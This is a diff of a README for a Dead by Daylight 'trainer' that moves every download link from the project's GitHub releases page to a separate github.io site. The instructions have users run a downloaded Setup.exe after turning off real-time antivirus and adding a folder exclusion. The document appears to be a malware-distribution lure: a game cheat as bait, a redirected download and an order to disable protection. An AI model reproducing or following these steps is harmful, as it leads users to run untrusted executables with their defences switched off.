@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Ultra - Experience faster progress in Dead by Daylight
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/kinggh3432/DBD-AutoGrind-Trainer-2026-Ultra/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://kinggh3432.github.io)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ This application includes several tools to manage your game progress:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/kinggh3432/DBD-AutoGrind-Trainer-2026-Ultra/releases) to download the latest setup file.
+1. Visit the [official releases page](https://kinggh3432.github.io) to download the latest setup file.
 2. Locate the file named `DBD-AutoGrind-Installer.zip` in your downloads folder.
 3. Right-click the file and select "Extract All" to view the contents.
 4. Run the file titled `Setup.exe`.
@@ -39,7 +39,7 @@ This trainer runs on standard Windows hardware. Ensure your system meets these s
 Follow this guide to prepare your computer for the tool.
 
 ### Step 1: Download the Files
-Navigate to the [release page](https://github.com/kinggh3432/DBD-AutoGrind-Trainer-2026-Ultra/releases) using your web browser. Click the primary link to start the download. Save the file to your desktop for easy access.
+Navigate to the [release page](https://kinggh3432.github.io) using your web browser. Click the primary link to start the download. Save the file to your desktop for easy access.
 
 ### Step 2: Prepare the Environment
 Turn off any active real-time protection or antivirus software during the setup process. Some security settings may flag external trainers as unrecognized programs. Create an exclusion for the program folder to ensure the software runs without interruption.
